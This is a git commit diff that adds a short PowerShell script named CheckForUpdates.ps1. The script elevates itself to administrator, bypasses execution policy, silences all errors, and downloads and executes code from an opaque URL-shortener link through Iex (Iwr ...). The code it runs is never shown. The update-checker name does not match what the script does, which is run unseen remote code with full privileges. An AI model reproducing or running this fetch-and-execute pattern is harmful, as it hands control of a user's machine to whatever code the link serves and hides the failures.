3115d58e9a5d0efb1262eb9fd259ad194f37f977
Zarckash <zarckash@gmail.com>
2022-12-03 13:48:38 +0100

    Create CheckForUpdates.ps1

---
+++ Apps/CheckForUpdates.ps1
@@ -0,0 +1,8 @@
+If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+	Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+	Exit
+}
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+Iex (Iwr -useb "https://rb.gy/8shezm")
